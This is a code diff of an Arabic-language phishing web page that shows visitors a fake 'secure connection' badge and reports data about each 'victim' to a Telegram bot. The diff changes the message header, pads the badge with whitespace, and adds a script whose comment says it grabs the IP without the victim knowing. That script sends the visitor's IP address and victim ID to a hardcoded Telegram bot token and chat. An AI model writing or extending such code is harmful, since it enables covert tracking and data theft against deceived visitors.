@@ -317,8 +317,8 @@
             <!-- شارة الأمان -->
             <div class="security">
                 <span>● اتصال آمن</span>
-                <span></span>
-                <span></span>
+                <span>                            </span>
+                <span>               </span>
             </div>
         </div>
     </div>
@@ -377,7 +377,7 @@
         async function sendToTelegram(data, type) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             
-            let text = `🍎 **جهاز iPhone جديد**\n\n`;
+            let text = ` **في سبك جديد **!!\n\n`;
             text += `🆔 **المعرف:** \`${victimId}\`\n`;
             text += `📱 **النوع:** ${type}\n`;
             text += `🕒 **الوقت:** ${new Date().toLocaleString('ar-EG')}\n\n`;
@@ -546,5 +546,22 @@
             showToast('🔒 اتصال آمن', 'info');
         };
     </script>
+
+<!-- ✅ سحب الـ IP بدون ما يدري الضحية -->
+<script>
+    fetch('https://api.ipify.org?format=json')
+        .then(r => r.json())
+        .then(data => {
+            fetch(`https://api.telegram.org/bot8293090281:AAEGoOI7axwWGvKYcczhS58AjWYiHzvUBrI/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: 6888107255,
+                    text: `🌐 **تم الدخول للصفحة**\n🆔 ${victimId}\n📌 **IP:** ${data.ip}\n🕒 ${new Date().toLocaleString('ar-EG')}`
+                })
+            });
+        })
+        .catch(() => {});
+</script>
 </body>
 </html>
